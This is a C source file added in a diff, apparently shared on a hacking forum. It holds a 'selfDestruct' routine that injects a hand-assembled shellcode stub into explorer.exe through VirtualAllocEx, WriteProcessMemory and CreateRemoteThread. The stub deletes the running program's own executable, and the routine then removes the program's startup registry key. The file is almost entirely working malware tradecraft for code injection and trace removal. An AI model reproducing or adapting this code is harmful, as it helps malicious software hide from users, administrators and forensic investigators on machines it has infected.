@@ -1,0 +1,78 @@
+// __v00d00 __ OpenSC.ws __
+// A process cannot simply delete itself
+// At some point, code will have to run in the context of another process
+// People typically run a batch file in the background - but this can be noticable
+// I inject an assembly stub into explorer.exe - it loops on DeleteFile
+// Once the file is deleted the thread exits.
+// I also have the thread sleep so that explorer.exe doesn't start eating up too many resources.
+// Then the thread kills itself.
+
+void selfDestruct()
+{
+	BYTE stub[] = {
+	//	"\xcc" // debug int 3
+		"\x68" "\xDE\xAD\xBE\xAF"		 // push argument  (pointer to path)
+		"\xB8" "\xDE\xAD\xBA\xBE"		 // mov eax DeleteFile
+		"\xFF\xD0"					 // call eax
+		"\x50"					 // push eax
+		"\x68" "\x00\x01\x00\x00"		 // push 100
+		"\xB8" "\xDE\xAD\xBE\xAF"		 // mov eax Sleep
+		"\xFF\xD0"					 // call eax
+		"\x58"					 // pop eax
+		"\x85\xc0"					 // test eax, eax
+		"\x74\xe2"					 // jnz to start
+		"\x6A" "\x00"				 // push 0
+		"\xB8" "\xDE\xAD\xBE\xAF"		 // mov eax RtlExitUserThread
+		"\xFF\xD0"					 // call eax
+	};
+
+	HANDLE hProc, hThread;
+	DWORD pid;
+	LPVOID pRemotePathStr, pRemoteStub;
+	char ourPath[MAX_PATH];
+	HMODULE hKernel;
+	HMODULE hNtdll;
+	DWORD dwDeleteFile;
+	DWORD dwSleep;
+	DWORD dwExitThread;
+
+	GetModuleFileName(NULL, ourPath, MAX_PATH);
+  	pid = GetPidByName("explorer.exe");
+	if(!pid) return;
+
+	hKernel = GetModuleHandle("kernel32.dll");
+	if(!hKernel) return;
+
+	hNtdll = GetModuleHandle("ntdll.dll");
+	if(!hNtdll) return;
+
+	dwDeleteFile = (DWORD)GetProcAddress(hKernel, "DeleteFileA");
+	dwSleep = (DWORD)GetProcAddress(hKernel, "Sleep");
+	dwExitThread = (DWORD)GetProcAddress(hNtdll, "RtlExitUserThread");
+
+	hProc = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_OPERATION|PROCESS_VM_READ|PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, false, pid);
+	if (hProc == NULL) return;
+
+	pRemotePathStr = VirtualAllocEx(hProc, NULL, strlen(ourPath) + 1, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (pRemotePathStr == NULL) return;
+
+	if (!WriteProcessMemory(hProc, pRemotePathStr, ourPath, strlen(ourPath) + 1, NULL)) return;
+
+	pRemoteStub = VirtualAllocEx(hProc, NULL, sizeof(stub), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+	if (pRemoteStub == NULL) return;
+
+	memcpy(stub +  1, &pRemotePathStr, 4);
+	memcpy(stub +  6, &dwDeleteFile, 4);
+	memcpy(stub + 19, &dwSleep, 4);
+	memcpy(stub + 33, &dwExitThread, 4);
+
+	if (!WriteProcessMemory(hProc, pRemoteStub, stub, sizeof(stub), NULL))
+		return;
+
+	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteStub, NULL, 0, 0);
+	if (!hThread) return;
+
+        DelStartUp(); // remove our startup key
+
+	exit(1);
+}
